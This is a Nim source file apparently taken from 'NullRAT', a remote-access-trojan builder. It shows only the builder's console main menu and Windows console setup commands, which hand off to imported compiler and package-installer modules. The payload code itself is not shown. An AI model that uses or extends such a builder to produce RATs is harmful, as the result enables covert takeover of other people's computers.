import std/terminal
import std/os
import std/random

from utils import cleanWorkingDir, printName

from compiler import compiler
from package import packageInstaller

randomize()

# Windows-only
when defined windows:
    discard execShellCmd("title NullRAT Builder")
    discard execShellCmd("chcp 65001 & color 4")
    discard execShellCmd("mode con: cols=80 lines=29")
    
proc mainMenu() =
    printName()
    stdout.styledWriteLine({styleBright}, "  >> NullRAT Builder v2.0 <<"); echo "";
    stdout.styledWriteLine(fgGreen, {styleBright}, " - HINT! Press Q in any window to immediately return here!")
    stdout.styledWriteLine({styleBright}, "\n Press any key to continue,\n E/Q to exit,\n R to clear working directory,\n C to directly move to compiler (if you've done all before)...")
    
    var input: char = getch()
    
    if input == 'E' or input == 'e' or input == 'Q' or input == 'q':
        quit(0)
    elif input == 'C' or input == 'c':
        discard compiler()
        quit(0)
    elif input == 'R' or input == 'r':
        cleanWorkingDir()
    else:
        packageInstaller()
            
while true:
    mainMenu()